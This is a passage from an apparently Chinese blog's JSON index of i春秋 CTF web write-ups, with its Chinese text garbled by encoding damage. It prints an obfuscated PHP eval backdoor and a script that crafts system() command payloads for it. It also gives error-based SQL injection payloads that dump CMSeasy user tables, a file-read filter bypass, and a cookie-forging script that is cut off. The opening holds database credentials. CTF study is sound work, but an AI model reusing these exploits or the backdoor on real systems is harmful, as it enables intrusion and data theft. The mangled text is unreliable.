123456789&lt;?php//æ•°æ®åº“è¿æ¥ä¿¡æ¯$cfg_dbhost = '127.0.0.1';$cfg_dbname = 'seacms';$cfg_dbuser = 'sea_user';$cfg_dbpwd = '46e06533407e';$cfg_dbprefix = 'sea_';$cfg_db_language = 'utf8';?&gt;","link":"/2021/02/12/i%E6%98%A5%E7%A7%8B3/"},{"title":"postiæ˜¥ç§‹11","text":"webâ€”â€”backdoorä»–è¯´æœ‰æºç æ³„éœ²ï¼Œå°±å…ˆè¯•è¯•gitæ³„æ¼ï¼Œhttp://8f5271da775d49a7a0166a25cc5c836e795e8d00fc0044de.changame.ichunqiu.com/Challenges/.git/ï¼Œåœ¨githackä¸­å°±æ‰«å‡ºæ¥ä¸‰ä¸ªæ²¡å•¥ç”¨çš„æ–‡ä»¶ï¼Œåæ¥åˆè¯•äº†ä¸€ä¸‹å¸¸è§çš„ç½‘ç«™å¤‡ä»½ç›®å½•ï¼Œéƒ½æ²¡æœ‰æ”¶è·ï¼Œçœ‹äº†ä¸€ä¸‹wpï¼Œæ‰çŸ¥é“è¿™é‡Œæ¶‰åŠåˆ°.gitæ–‡ä»¶çš„å†å²æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹ä¹‹å‰çš„æ–‡ä»¶ï¼Œä½¿ç”¨GitHackéœ€è¦æ›´éº»çƒ¦çš„ä¿®æ”¹ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨Git_Extract åœ¨ä¸€ä¸ªä¸ªæ‰“å¼€çœ‹ä¹‹åå¾—åˆ°ï¼š 123&lt;?phpecho &quot;flag{true_flag_is_in_the_b4ckdo0r.php}&quot;;?&gt; ç„¶åå¥¹è¯´è®©æˆ‘ä»¬æ‰¾codeï¼ŒçŒœæµ‹è¿™æ¬¡åº”è¯¥å°±æ˜¯ç½‘ç«™çš„å¤‡ä»½æ–‡ä»¶äº†ï¼Œä½†æ˜¯è¯•äº†ä¸€åœˆä¸‹æ¥ï¼Œéƒ½æ²¡æ‰¾åˆ°ï¼Œå‘ç°æ˜¯.swoåç¼€ã€‚ã€‚ã€‚ã€‚ä¸‹è½½ä¸‹æ¥åæ”¹åç¼€ç”¨kaliæ‰“å¼€ 123456789101112131415161718192021&lt;?phpecho &quot;can you find the source code of me?&quot;;/** * Signature For Report */$h='_)m/&quot;,&quot;/-/)m&quot;),)marray()m&quot;/&quot;,&quot;+&quot;)m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)';/* */$H='m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(&quot;&lt;)m$k&gt;$d&lt;)m/)m$k&gt;)m&quot;);@sessio)mn_d)mestroy();}}}}';/* */$N='mR;$rr)m=@$r[)m&quot;HTT)mP_RE)mFERER&quot;];$ra)m=)m@$r[&quot;HTTP_AC)mC)mEPT_LANG)mUAGE)m&quot;)m];if($rr)m&amp;&amp;$ra){)m$u=parse_u)mrl($rr);p';/* */$u='$e){)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(&quot;/';/* */$f='$i&lt;$)ml;)m){)mfo)mr($j)m=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j)m++,$i+)m+){$)mo.=$t{$i)m}^$)mk{$j};}}r)meturn )m$o;}$r)m=$_SERVE)';/* */$O='[$i]=&quot;&quot;;$p)m=$)m)mss($p,3)m);}if(ar)mray_)mkey_exists)m()m$i,$s)){$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif(';/* */$w=')m));)m$p=&quot;&quot;;fo)mr($z=1;)m$z&lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0){$s)m';/* */$P='trt)molower&quot;;$)mi=$m[1][0)m)m].$m[1][1])m;$h=$sl()m$ss(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml($ss()m)mmd5($i.$kf),0,3';/* */$i=')marse_)mstr)m($u[&quot;q)muery&quot;],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m&quot;/([\\\\w)m])m)[\\\\w-)m]+(?:;q=0.)';/* */$x='m([\\\\d)m]))?,?/&quot;,)m$ra,$m))m;if($q)m&amp;&amp;$)mm))m)m{@session_start();$)ms=&amp;$_S)mESSI)m)mON;$)mss=&quot;sub)mstr&quot;;$sl=&quot;s)m';/* */$y=str_replace('b','','crbebbabte_funcbbtion');/* */$c='$kh=&quot;4f7)m)mf&quot;;$kf=&quot;2)m)m8d7&quot;;funct)mion x($t)m,$k){$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=&quot;&quot;;for()m$i=0;';/* */$L=str_replace(')m','',$c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H);/* */$v=$y('',$L);$v();/* */ echo($L);//è¿™ä¸€å¥æ˜¯ä¸ºäº†å¾—åˆ°$LåŠ ä¸Šå»çš„ï¼Œæ¢å¤å¾—åˆ°çš„æ–‡ä»¶ä¸­å¹¶æ²¡æœ‰?&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php$kh=&quot;4f7f&quot;;$kf=&quot;28d7&quot;;function x($t,$k){ $c=strlen($k); $l=strlen($t); $o=&quot;&quot;; for($i=0;$i&lt;$l;) { for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l); $j++,$i++) { $o.=$t{$i}^$k{$j}; } } return $o; }$r=$_SERVER;$rr=@$r[&quot;HTTP_REFERER&quot;];$ra=@$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];if($rr&amp;&amp;$ra){ $u=parse_url($rr);#parse_url()æœ¬å‡½æ•°è§£æä¸€ä¸ª URL å¹¶è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ï¼ŒåŒ…å«åœ¨ URL ä¸­å‡ºç°çš„å„ç§ç»„æˆéƒ¨åˆ†ã€‚ parse_str($u[&quot;query&quot;],$q);//è¿™é‡Œå°±æ˜¯è¦è®©æˆ‘ä»¬ä¼ å‚æ•°å‚æ•°åéƒ½å¯ä»¥ï¼Œè¿™é‡Œæ˜¯è¦è·Ÿä¸‹é¢æ‰“é…åˆçš„ $q=array_values($q); preg_match_all(&quot;/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/&quot;,$ra,$m);//è¿™é‡ŒåŒ¹é…çš„å†…å®¹æ˜¯ä»»æ„ä¸€ä¸ªå­—æ¯ åŒ¹é…ä»»æ„ä¸€ä¸ªå­—æ¯å’Œç¬¦å·- åŒ¹é…;q=0.åŠ ä¸Šä¸€ä¸ªæ•°å­—ï¼Œæ¥ä¸‹æ¥è¿˜ä¼šå»ºç«‹ä¸‰ä¸ªæ•°ç»„ï¼Œä¸€ä¸ªå°±æ˜¯æ ¹æ®ä¸Šé¢çš„åŒ¹é…å†…å®¹ï¼Œç¬¬äºŒä¸ªæ˜¯æ”¾ç½®æ‰€æœ‰åŒ¹é…å†…å®¹çš„é¦–å­—æ¯ï¼Œç¬¬ä¸‰ä¸ªæ˜¯æ”¾ç½®æ‰€æœ‰åŒ¹é…å†…å®¹å½“ä¸­çš„æ•°å­—å†…å®¹ if($q&amp;&amp;$m) { @session_start(); $s=&amp;$_SESSION; $ss=&quot;substr&quot;; $sl=&quot;strtolower&quot;; $i=$m[1[0].$m[1[1]; $h=$sl($ss(md5($i.$kh),0,3));//å¾—åˆ°æ•°å€¼675 $f=$sl($ss(md5($i.$kf),0,3));//a3e $p=&quot;&quot;; for($z=1;$z&lt;count($m[1]);$z++) $p.=$q[$m[2][$z]];//è¿™é‡Œ$qçš„ä¸‹æ ‡æ¥è‡ªäº$mæœ€åçš„ä¸€ç»„é‡Œé¢çš„æ•°å­—ï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œåªæœ‰åœ¨4çš„æ—¶å€™æ‰ä¸º3ï¼Œæ‰€ä»¥ä¸Šé¢çš„queryéœ€è¦ä¼ å…¥ä¸‰ä¸ªæ•°å€¼ if(strpos($p,$h)===0) //åˆ¤æ–­$pçš„å‰ä¸‰ä¸ªå€¼æ˜¯å¦ä¸º$på¦‚æœæ˜¯å¾€ä¸‹ { $s[$i]=&quot;&quot;;//è¿›æ¥è¿™ä¸ªåˆ¤æ–­æ˜¯å¿…é¡»çš„ï¼Œè¿™æ ·æ‰ä¼šç»•è¿‡ä¸‹é¢é‚£ä¸ªåˆ¤æ–­ï¼Œæ­¤æ—¶$s:{zz =&gt; &quot;&quot;}[1] $p=$ss($p,3);//æˆªå–ä»ç¬¬ä¸‰ä¸ªå­—ç¬¦ä»¥å } if(array_key_exists($i,$s)) { $s[$i].=$p; $e=strpos($s[$i],$f); if($e)//åˆ¤æ–­a3eæ˜¯å¦åœ¨è¾“å…¥çš„æ•°æ®å½“ä¸­ { $k=$kh.$kf;ob_start(); @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;,&quot;/-/&quot;),array(&quot;/&quot;,&quot;+&quot;),$ss($s[$i],0,$e))),$k)));//æ­£åˆ™æ›¿æ¢åè¿›è¡Œå¼‚æˆ–è¿ç®—å†è§£ç è§£å‹ $o=ob_get_contents();//evalæ‰§è¡Œå†…å®¹ä¼ å…¥o ob_end_clean(); $d=base64_encode(x(gzcompress($o),$k)); print(&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;);); @session_destroy(); } } } } ?&gt; æ„ŸåŠ¨åˆ°çƒ­æ³ªç›ˆçœ¶ï¼Œä¸ºå•¥æ²¡æœ‰æ—©ç‚¹ç”¨phpstormï¼Œç”¨äº†è¿™ä¸ªå·¥å…·ï¼Œåœ¨å®¡è®¡ä»£ç çš„è¿‡ç¨‹ä¸­å˜å¾—å¥½ç®€å•ï¼ï¼ï¼ä»£ç å®¡è®¡å®Œåï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æ“ä½œçš„å°±æ˜¯æ„é€ æˆ‘ä»¬çš„payloadï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥ç”¨phpå†™ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼š 123456789101112131415161718192021&lt;?phpfunction x($t,$k){ $c=strlen($k); $l=strlen($t); $o=&quot;&quot;; for($i=0;$i&lt;$l;) { for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l); $j++,$i++) { $o.=$t[$i]^$k[$j]; } } return $o; }$o=&quot;system('ls');&quot;;//è®°å¾—åé¢åŠ åˆ†å·$k=&quot;4f7f28d7&quot;;$c=&quot;TPp8VHv2Kv4DTuVN+hCEff8ve2EBCpdlZk33ypDEwMumBIr0uCrKpbiq1Z5+6xyPHma96ydT&quot;;//è¿™ä¸ªæ˜¯å¾—åˆ°çš„å›æ˜¾$d=base64_encode(x(gzcompress($o),$k));$c=@gzuncompress(@x(@base64_decode($c),$k));//è¿™æ˜¯è§£å¯†ä»£ç print($d);print($c);?&gt; è¿™è¾¹æœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹: 1.ä¼ å…¥çš„å‚æ•°çš„ä¸ªæ•°ï¼Œæˆ‘ä»¬ä¸Šé¢æœ‰ä¸ªå¾ªç¯$p.=$q[$m\\[2][$z]];å› ä¸ºæœ‰è¿™ä¸ªå­˜åœ¨ï¼Œæ‰€ä»¥éœ€è¦æ³¨æ„languageé‚£ä¸€æ çš„ä¸ªæ•°ï¼Œé˜²æ­¢pæ²¡æœ‰è·å–åˆ°æˆ‘ä»¬çš„ä»£ç å¯¼è‡´åé¢çš„åˆ¤æ–­è¿‡ä¸å» 2.è¿™é‡Œçš„refereréœ€è¦è‡ªå·±æ·»åŠ ä¸€ä¸‹ æ¥ä¸‹æ¥æˆ‘ä»¬å°±ç›´æ¥catflag ä½†æ˜¯é‚£è¾¹æœ‰ä¸ªæ­£åˆ™æ›¿æ¢å¼ï¼Œè¯¥æ€ä¹ˆç»•è¿‡_å‘¢ï¼Ÿä½†å…¶å®ä¸ç”¨ç»•è¿‡æ¥ç€ï¼Œç»è¿‡base64ç¼–ç åæˆ‘ä»¬çš„è¯­å¥ä¸­å·²ç»æ²¡æœ‰\\_ä¹‹ç±»çš„ä¸œè¥¿äº†ï¼Œ è¿™æ˜¯ç»è¿‡æµ‹è¯•ä»¥åçš„å¯ä»¥çœ‹åˆ°åœ¨evalä¸­æ‰§è¡Œçš„å†…å®¹å·²ç»æ˜¯OKçš„è¯­å¥äº† é‚£ä¸ºå•¥åœ¨ç½‘é¡µç«¯æ‰§è¡Œä¸å‡ºæ¥å‘¢ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡æœ‰ï¼Ÿæ‰¾äº†å‡ ä¸ªwpï¼Œæœ‰ä¸€ä¸ªä¹Ÿæ˜¯è¿™ç§æƒ…å†µï¼Œæœ€ååœ¨linuxç³»ç»Ÿå°±å¯ä»¥æ‰§è¡Œäº†ï¼æˆ‘å°è¯•äº†ä¸€ä¸‹ï¼Œä¹Ÿå¯ä»¥äº† å°ç»“æ²¡æƒ³åˆ°ç”¨äº†phpstormè¿™ä¹ˆæ–¹ä¾¿ï¼Œæœ‰æ—¶é—´ä¸€å®šè¦å›å»é‡åšä¸€äº›ä»£ç å®¡è®¡é¢˜ webâ€”â€”ä¿¡æ¯æ”¶é›†flag3:p0rtant_hack}â€”â€”é€šè¿‡ç›®å½•.index.php.swpå¾—åˆ°flag2:s_v3ry_im .â€”â€”é€šè¿‡index.php~å¾—åˆ°flag1:n1book{info_1â€”â€”é€šè¿‡robots.txtå¾—åˆ°åšåˆ°ç°åœ¨æ„Ÿè§‰æœ€ç®€å•çš„é¢˜ç›®äº†å§ã€‚ã€‚","link":"/2021/03/05/i%E6%98%A5%E7%A7%8B11/"},{"title":"iæ˜¥ç§‹4","text":"webâ€”â€”123æ‰¾äº†ä¸€ä¸‹ï¼Œå‘ç°ä¸€ä¸ªæç¤ºï¼Œç”¨æˆ·ä¿¡æ¯åœ¨user.phpå½“ä¸­ ä½†æ˜¯å½“æˆ‘ç›´æ¥æ‰“å¼€user.phpçš„æ—¶å€™ï¼Œå•¥ä¹Ÿæ²¡æœ‰ï¼Œå°è¯•äº†ä¸€ä¸‹å‘ç°äº†user.php.bakæ–‡ä»¶ï¼Œä¸‹è½½æ‰“å¼€ è¿™é‡Œéœ€è¦è¯´ä¸€ä¸‹ï¼šè¿™é‡Œå±äºå¤‡ä»½éšç§æ–‡ä»¶æ³„éœ²ï¼Œåç¼€ä¹‹å‰æœ‰æ•´ç†è¿‡äº† æ‰“å¼€ä»¥åï¼Œé‡Œé¢å‡ä¸ºç”¨æˆ·ä¿¡æ¯ï¼Œç»“åˆæç¤ºå¯†ç ä¸ºç”¨æˆ·ååŠ å‡ºç”Ÿæ—¥æœŸï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰æä¾›å‡ºç”Ÿæ—¥æœŸï¼Œåªæœ‰ç”¨æˆ·åï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å°†å¹´é¾„è®¾ç½®ä¸€ä¸‹ç›´æ¥è·‘ç”¨æˆ·åå°±è¡Œï¼Œå¦‚ä¸‹ï¼šè¿™é‡Œå­¦ä¸€ä¸‹å¦‚ä½•ç”¨burpåŒæ—¶çˆ†ç ´ä¸¤ä¸ªå˜é‡ ï¼Œé€‰æ‹©è¿™ä¸ªæ¨¡å¼å³å¯ å…¶ä»–æ¨¡å¼å‚è€ƒï¼šhttps://blog.csdn.net/qq_39101049/article/details/90234669å‘ç°è¿™ä¸ªäººçš„è´¦å·å¯†ç æ˜¯OKçš„ ç™»å½•è¯•è¯•ä¸€ç‰‡ç©ºç™½ï¼ŒæŸ¥çœ‹æºç ï¼š ç”±äºè¿™é‡Œè¢«æ³¨é‡Šäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å†åˆ›å»ºä¸€ä¸ªï¼Œç„¶åé¡µé¢ä¸Šå°±ä¼šå‡ºç°æ–‡ä»¶ä¸Šä¼ çš„å…¥å£äº† ä¸Šä¼ phpæ–‡ä»¶ï¼Œå‘ç°å­˜åœ¨è¿‡æ»¤ï¼Œä½†æ˜¯ä¸çŸ¥é“æ˜¯ä¸æ˜¯ç™½åå•ï¼Œå°è¯•ä¸€ä¸‹å…¶ä»–æ–‡ä»¶ç±»å‹å°è¯•äº†å¥½å‡ ç§å‘ç°æ²¡æœ‰ç»“æœï¼Œæ„Ÿè§‰è¿˜æŒºå¥‡æ€ªçš„ï¼Œå¯èƒ½å› ä¸ºæ˜¯ä»–çš„ä»£ç é‡Œé¢å†™çš„æ˜¯æ£€æµ‹ç¬¬ä¸€ä¸ª.åé¢çš„å†…å®¹æ˜¯å¦åŒ…å«ç™½åå•æ–‡ä»¶å§ï¼Œå› ä¸ºæ˜¯é¢˜ç›®ï¼Œæ‰€ä»¥ç¬¬äºŒç‚¹å·åé¢å¦‚æœä¸ºphtï¼Œphtmlçš„æ—¶å€™ä½†æ˜¯ä¸èƒ½åŒ…å«php3çš„æ—¶å€™æ–‡ä»¶æ‰ä¼šè¢«æˆåŠŸä¸Šä¼ ï¼Œå°½ç®¡ä½ ä¸Šä¼ ç™½åå•çš„é‚£ä¸‰ä¸ªæ–‡ä»¶ï¼Œä¹Ÿæ˜¯ä¼šè¿”å›è¯´æ–‡ä»¶åä¸åˆæ³•çš„ï¼Œåˆ°äº†è¿™é‡Œï¼Œå…¶å®å°±æ˜¯å°è¯•äº†ï¼Œä¹Ÿæ²¡å•¥å¥½è¯´çš„ï¼Œæ„Ÿè§‰å¯ä»¥åšä¸€ä¸ªå­—å…¸ï¼Œåç¼€å­—å…¸ï¼Œåˆ°æ—¶å€™è·‘ä¸€ä¸‹å°±è¡Œäº†ã€‚ã€‚ã€‚ä¸€å¼€å§‹æœ‰ç‚¹å®šæ€§æ€ç»´ï¼Œè®¤ä¸ºæ˜¯apacheè§£ææ¼æ´ï¼Œä»å³åˆ°å·¦è¿›è¡Œåˆ¤æ–­ï¼Œæ‰€ä»¥æˆ‘æ„é€ çš„éƒ½æ˜¯123.php.jpgä¹‹ç±»çš„æ–‡ä»¶ï¼Œå°è¯•äº†å¥½å¤šç§ç»„åˆéƒ½æ— æœï¼Œæœ€åçœ‹äº†ä¸€ä¸‹wpæ‰çŸ¥é“ã€‚ã€‚ã€‚æœç„¶è¿˜æ˜¯è¦å¤šåˆ·é¢˜ å½“æˆ‘æ‰“å¼€è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™åœ¨çœ‹äº†ä¸€ä¸‹æºç ï¼Œå’ŒæŠ¥æ–‡ï¼Œæ²¡æœ‰å…¶ä»–æ”¶è·ï¼Œè¯•è¯•æ˜¯ä¸æ˜¯æ–‡ä»¶åŒ…å«å§ï¼Ÿå› ä¸ºè¿™ä¸ªæ—¶å€™ä¹Ÿåªæœ‰è¿™ç§å¯èƒ½äº†ä»–ä¸€å¼€å§‹è¯´è¿‡æ»¤äº†flagï¼Œåœ¨å°è¯•äº†å¤§å°å†™æ··å†™ä»¥åï¼Œå‘ç°å¤å†™flagå°±å¯ä»¥ç»•è¿‡äº† webâ€”â€”YeserCMSæŸ¥æ‰¾æ¼æ´é¢˜ã€‚ã€‚ã€‚çœ‹ä¸€ä¸‹ç½‘ç«™æ¡†æ¶åœ¨è¯„è®ºåŒºçœ‹åˆ°ç™¾åº¦æŸ¥æ‰¾cmseasyæ¼æ´ï¼Œæ¥ä¸‹æ¥å°±çœ‹ç€æ“ä½œäº†ã€‚ã€‚ã€‚æ¼æ´å‡ºç°åœ¨parse_str($sQuery,$aArray);æ‰€ä»¥ å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ 1234elive/live/header.phppostï¼šxajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(database())) ),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;//è¿™é‡Œä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œ æ‰€ä»¥ è·³è½¬ï¼šhttp://3f50fc9615c747578e1c6fd0a4a9d076c1687d99683d45b6.changame.ichunqiu.com//celive/live/header.phpç„¶åpostå‘é€ä¸€ä¸‹ä»¥ä¸Špayloadï¼šå¾—åˆ° 1xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()) ,720,900),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt; ä»¥ä¸Šæ˜¯çˆ†è¡¨ï¼Œç”±äºä¸€æ¬¡æ€§æ˜¾ç¤ºçš„å­—ç¬¦æ•°æœ‰é™åˆ¶ï¼Œæ‰€ä»¥ï¼Œåœ¨ä¸æ–­æ›´æ¢åé¢çš„æ˜¾ç¤ºæ®µæ•°ï¼Œæ‰¾åˆ°äº†userè¡¨ 1xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT((column_name)) from information_schema.columns where table_name='yesercms_user') ,1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt; æ¥ä¸‹æ¥å°±æ˜¯æ‹¿åˆ°è´¦å·å¯†ç äº†admin ff512d4240cbbdeafada404677ccbe61 1xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,password)) from yesercms_user) ,10,42),0x5d),1)),NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt; å¯†ç ä¸ºmd5åŠ å¯†ï¼Œè§£å¯†å®Œä»¥åæ˜¯Yeser231 æˆåŠŸç™»é™†ä»¥åï¼Œåœ¨ç½‘é¡µä¸­å¯»æ‰¾å¯ä»¥æ‰“å¼€flag.phpçš„åœ°æ–¹ï¼Œåˆ©ç”¨burpsuitæŠ“åŒ…ä¿®æ”¹å‚æ•°å³å¯ webâ€”â€”Codeå›¾ç‰‡åé¢æ˜¯ç»è¿‡base64åŠ å¯†ï¼Œè§£å¯†ä»¥åå¯å¾—ï¼š 123456789101112131415161718&lt;?php /** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */ header('content-type:text/html;charset=utf-8'); if(! isset($_GET['jpg'])) header('Refresh:0;url=./index.php?jpg=hei.jpg'); $file = $_GET['jpg']; echo '&lt;title&gt;file:'.$file.'&lt;/title&gt;'; $file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file); $file = str_replace(&quot;config&quot;,&quot;_&quot;, $file); $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src='data:image/gif;base64,&quot;.$txt.&quot;'&gt;/&lt;/img&gt;&quot;; /** Can you find the flag file?**/?&gt; ä»ä¸Šé¢ä¿¡æ¯å¯å¾—åˆ°ï¼Œä¸ºphpstormåˆ›å»ºæ‰€å¾—ï¼Œphpstormæ˜¯phpä»£ç çš„é›†æˆå¼€å‘ç¯å¢ƒï¼Œä¸‹è½½phpstormï¼Œå¹¶æ–°å»ºä¸€ä¸ªé¡¹ç›®ï¼Œä¼šå‘ç°åœ¨é¡¹ç›®æ–‡ä»¶å¤¹é‡Œé¢ä¼šç”Ÿæˆä¸€ä¸ª.ideaæ–‡ä»¶ï¼Œå®ƒå­˜å‚¨äº†é¡¹ç›®çš„é…ç½®æ–‡ä»¶ï¼Œ æ‰“å¼€.ideaæ–‡ä»¶å¯ä»¥å‘ç°misc.xml,modules.xml,workspace.xmlæ–‡ä»¶ã€‚ 1http://a8af39458fca4aa7a15a802e4b9f189cfb7d36988dba497a.changame.ichunqiu.com/.idea/workspace.xml æ‰“å¼€æ­¤URLï¼Œçœ‹åˆ°é…ç½®æ–‡ä»¶ï¼Œå‘ç°fl3g_ichuqiu.phpæ–‡ä»¶æ‰“å¼€å®ƒçœ‹çœ‹ 1http://a8af39458fca4aa7a15a802e4b9f189cfb7d36988dba497a.changame.ichunqiu.com/index.php?jpg=fl3gconfigichuqiu.php å› ä¸ºä¸Šé¢è¯´å¯ä»¥ç”¨configæ›¿æ¢_åœ¨æˆ‘ç›´æ¥ä½¿ç”¨_çš„æ—¶å€™æ˜¯æ‰“ä¸å¼€çš„ï¼Œå½“æˆ‘å˜æˆconfigæ‰èƒ½æ‰“å¼€ã€‚ã€‚ï¼Œç„¶åå°±åˆä¼šçœ‹åˆ°ä¸€æ®µä½¿ç”¨base64ç¼–ç çš„å­—ç¬¦ä¸² 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?php/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */error_reporting(E_ALL || ~E_NOTICE);include('config.php');function random($length, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') { $hash = ''; $max = strlen($chars) - 1; for($i = 0; $i &lt; $length; $i++) { $hash .= $chars[mt_rand(0, $max)];//ç”Ÿæˆéšæœºæ•° } return $hash;//è¿”å›éšæœºæ•°}function encrypt($txt,$key){ for($i=0;$i&lt;strlen($txt);$i++){ $tmp .= chr(ord($txt[$i])+10);//ordè¿”å›10è¿›åˆ¶ï¼Œchrè¿”å›ç›¸å¯¹åº”äº ascii æ‰€æŒ‡å®šçš„å•ä¸ªå­—ç¬¦ã€‚æ­¤å‡½æ•°ä¸ ord() æ˜¯äº’è¡¥çš„ } $txt = $tmp;//tmpæ˜¯åŸæœ¬çš„txtåè¿›åˆ¶+10ä»¥åçš„æ•°å€¼ $rnd=random(4);//è°ƒç”¨randomå‡½æ•°ï¼Œå–å¾—å››ä½éšæœºæ•°ï¼Œè¿™ä¸ªå°±æ˜¯ä¸‹é¢è§£å¯†æ‰€éœ€è¦æˆªå–çš„å‰å››ä½ $key=md5($rnd.$key);//å°†rndå’Œkeyæ‹¼æ¥åmd5åŠ å¯† $s=0; for($i=0;$i&lt;strlen($txt);$i++){ if($s == 32) $s = 0; $ttmp .= $txt[$i] ^ $key[++$s];//ttmpæ˜¯txtå’Œkeyå¼‚æˆ–åçš„æ•°å€¼ } return base64_encode($rnd.$ttmp); //è¿”å›çš„æ˜¯rndå’Œttmp}function decrypt($txt,$key){ $txt=base64_decode($txt); $rnd = substr($txt,0,4); $txt = substr($txt,4); $key=md5($rnd.$key); $s=0; for($i=0;$i&lt;strlen($txt);$i++){ if($s == 32) $s = 0; $tmp .= $txt[$i]^$key[++$s];//è¿›è¡Œå¼‚æˆ–è¿ç®— } for($i=0;$i&lt;strlen($tmp);$i++){ $tmp1 .= chr(ord($tmp[$i])-10); } return $tmp1;}$username = decrypt($_COOKIE['user'],$key);if ($username == 'system'){ echo $flag;}else{ setcookie('user',encrypt('guest',$key)); echo &quot;a??(a?Ë‰a??a?Â°)a?-&quot;;}?&gt; æ±‚è§£æ€è·¯ï¼šå…ˆå¯¹systemä½¿ç”¨ordå’Œchr+10ï¼Œç„¶åå†å’Œkeyè¿›è¡Œå¼‚æˆ–ï¼Œå°±å¯ä»¥å¾—åˆ°txtï¼Œè€Œtxtå°±æ˜¯æˆ‘ä»¬éœ€è¦è¾“å…¥çš„å†…å®¹å…¶ä¸­ keyæ˜¯æœªçŸ¥çš„ï¼Œæ‰€ä»¥keyçš„æ±‚è§£éœ€è¦æˆ‘ä»¬ä»åé¢çš„setcookieä¸­å¾—åˆ°ï¼Œç”¨guestä½œä¸ºtxtï¼Œç”¨ordå’Œchrå„åŠ 10ï¼Œå¾—åˆ°tmpï¼Œæ­¤æ—¶çš„txtå°±ç­‰äºtmpäº†ï¼Œrndæ˜¯ä¸€ä¸ªå››ä½çš„éšæœºæ•°ï¼Œå’Œkeyæ‹¼æ¥åmd5åŠ å¯†å¾—åˆ°ä¸€ä¸ªæ–°çš„keyï¼Œè¦å¾—åˆ°è¿™ä¸ªæ–°çš„keyï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨è¿”å›çš„cookieå’Œtmpå¼‚æˆ–è¿ç®—å¾—åˆ° ä¼ é€ä¸ªcookieå€¼ï¼Œè¦è®©ä»–ç»è¿‡ä¸€ç³»åˆ—çš„è§£ç è¿ç®—åç­‰äºsystem æˆ‘ä»¬æ‰“å¼€fl3g_ichunqiu.phpï¼Œä¼šå‘ç°ä»–æœ‰é‚£ä¸ªuserçš„cookieï¼Œæ¥ä¸‹æ¥ç¼–å†™è„šæœ¬: 1234567891011121314151617181920212223242526272829import requestsimport base64url=&quot;http://b500619026b94e8ab02418c859eee290591d7abb431148af.changame.ichunqiu.com/fl3g_ichuqiu.php&quot;s= requests.session()return_user= s.get(url).cookies['user']de_user=base64.b64decode(return_user).decode('Latin-1')rnd=de_user[0:4]#å››ä½éšæœºæ•°ttmp=de_user[4:]#print(ttmp)key=list('xxxxxx')txt=list('guest')system=list('system')for i in range(len(txt)): txt[i]=chr(ord(txt[i])+10)for i in range(len(txt)): key[i]=chr(ord(ttmp[i])^ord(txt[i]))for i in range(len(system)): system[i]=chr(ord(system[i])+10)try_word='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'ttmp_new=''cookie_system=[]for i in try_word: key[5]=i for j in range(len(system)): ttmp_new +=chr(ord(key[j])^ord(system[j])) str =base64.b64encode((rnd+ttmp_new).encode('Latin-1')) 